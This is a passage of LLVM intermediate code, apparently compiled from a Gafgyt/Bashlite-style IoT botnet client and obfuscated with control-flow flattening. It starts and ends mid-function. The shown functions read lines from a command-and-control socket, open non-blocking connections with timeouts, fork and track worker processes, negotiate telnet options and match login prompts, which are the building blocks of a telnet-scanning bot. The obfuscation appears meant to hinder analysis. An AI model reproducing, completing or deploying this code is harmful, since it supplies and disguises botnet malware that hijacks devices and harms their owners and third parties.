  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 181214805, i32 -1814774154
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1751266431, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 140479718, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 2091930846, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2091930846, label %24
    i32 774039801, label %33
    i32 -435126499, label %50
    i32 1365656600, label %51
    i32 1423125520, label %55
    i32 -1534279952, label %60
    i32 -169961750, label %69
    i32 -2095921250, label %86
    i32 1213874377, label %89
    i32 2044243069, label %90
    i32 1183436910, label %91
    i32 266559320, label %93
    i32 700775788, label %98
    i32 1156084553, label %103
    i32 -962759564, label %105
    i32 109139606, label %113
    i32 1769928133, label %114
    i32 949955707, label %117
    i32 -1122522001, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 774039801, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -435126499, i32 1183436910
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 1365656600, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 1423125520, i32 2044243069
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 -1534279952, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 -169961750, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 -2095921250, i32 1213874377
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 1365656600, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 2044243069, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 1183436910, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 266559320, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 700775788, i32 949955707
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 1156084553, i32 -962759564
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 -1122522001, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 109139606, i32 1769928133
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 949955707, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 266559320, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 -1122522001, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1977679481, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1977679481, label %first
    i32 -1296055559, label %37
    i32 -1158487017, label %38
    i32 610744423, label %47
    i32 -675199910, label %52
    i32 -2081833273, label %57
    i32 -331279170, label %66
    i32 -1823655940, label %83
    i32 -606139252, label %90
    i32 -1136820780, label %91
    i32 -1038350184, label %92
    i32 -1063499210, label %93
    i32 -200228204, label %94
    i32 1231288158, label %95
    i32 1336467022, label %96
    i32 1923500707, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -1296055559, i32 -1158487017
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1923500707, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 610744423, i32 1336467022
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -675199910, i32 -200228204
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -2081833273, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -331279170, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -1823655940, i32 -1038350184
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -606139252, i32 -1136820780
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1923500707, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -1063499210, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1923500707, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 1231288158, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1923500707, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1336467022, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 1923500707, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1837199881, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1837199881, label %first
    i32 382784671, label %9
    i32 1058862418, label %11
    i32 -532865347, label %19
    i32 -1913335784, label %26
    i32 -111255391, label %36
    i32 -1541029841, label %39
    i32 -1089478861, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 382784671, i32 1058862418
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -1089478861, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -532865347, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 -1913335784, i32 -1541029841
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 -111255391, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -532865347, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -1089478861, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2115895930, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -2115895930, label %NodeBlock
    i32 764970319, label %LeafBlock1
    i32 -1203141988, label %LeafBlock
    i32 1178575569, label %16
    i32 1152831121, label %17
    i32 -1393639167, label %26
    i32 -847073921, label %27
    i32 -391268236, label %34
    i32 -1824224447, label %35
    i32 -420834582, label %42
    i32 723733965, label %50
    i32 -12144052, label %58
    i32 -1562135586, label %59
    i32 -1296705084, label %60
    i32 -1357723672, label %NewDefault
    i32 -1458108073, label %67
    i32 1499602158, label %68
    i32 1849387347, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -1203141988, i32 764970319
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 1178575569, i32 -1357723672
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 1152831121, i32 -1357723672
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 1849387347, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 -1393639167, i32 -847073921
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 -1296705084, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 -391268236, i32 -1824224447
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1562135586, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 -420834582, i32 723733965
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 -12144052, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 -12144052, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1562135586, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -1296705084, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 1499602158, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1458108073, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 1499602158, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 1849387347, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -588685437, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -588685437, label %11
    i32 -435784260, label %18
    i32 317199666, label %19
    i32 736779042, label %24
    i32 -579558819, label %37
    i32 -1919330969, label %50
    i32 -2054523515, label %63
    i32 -1282987353, label %75
    i32 -1722011947, label %76
    i32 1383534771, label %78
    i32 699426079, label %81
    i32 1907471825, label %100
    i32 2132271637, label %101
    i32 -728840855, label %102
    i32 -644074082, label %105
    i32 -1337787243, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -435784260, i32 -644074082
